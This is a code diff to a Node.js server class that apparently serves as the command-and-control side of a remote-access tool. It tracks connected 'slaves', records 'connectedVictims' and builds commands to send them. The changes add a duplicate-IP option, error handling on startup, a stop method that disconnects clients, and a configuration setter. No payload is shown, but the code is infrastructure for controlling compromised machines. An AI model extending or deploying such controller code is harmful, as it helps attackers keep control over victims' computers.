@@ -64,7 +64,7 @@ class Server extends EventEmitter{
             // ----------- on connection
             let ip = conn.remoteAddress;
             let realIP = ip;
-            if(Store.get("Constants"))
+            if(Store.get("Constants").allowDuplicatedIPs)
                 ip = `${ip}-${Tools.randomStr(5)}`;
 
             this.connectedSlaves[ip] = {
@@ -98,8 +98,23 @@ class Server extends EventEmitter{
 
             conn.on("data", (data) => this.socketDataHandler({data : data.toString() , conn, ip, bytes : data}));
         });
-        this.server.listen(this.port, "0.0.0.0");
+        try {
+            this.server.listen(this.port, "0.0.0.0");
+        } catch (error) {
+            console.log("Error starting the server: ".bgRed.white, error);
+            return;
+        }
         this.intialContanctInvoker();
+    }
+
+    stop(){
+        // imploment server stop here
+        for (const ip in this.connectedSlaves) {
+            let s = this.connectedSlaves[ip];
+            if(s.status == 1)
+                s.conn.end();
+        }
+        return this.server.close();
     }
 
     makeCommand(method = "", args = []){
@@ -219,6 +234,13 @@ class Server extends EventEmitter{
         this.connectedSlaves[ip].status = 0;
         Action.push(Store.get("Constants").connectedVictims, { key: ip, payload: this.connectedSlaves[ip] });
         console.warn(`${ip}/${realIP} disconnected; ${event || ""}`.red);
+    }
+
+    setConfig(name = "", status = null){
+        if(status != null && name != ""){
+            let [stat, config] = Settings.set({obj: name, value: status});
+            return [stat, config];
+        }
     }
 
     deleteOfflineSlaves(ip = null){
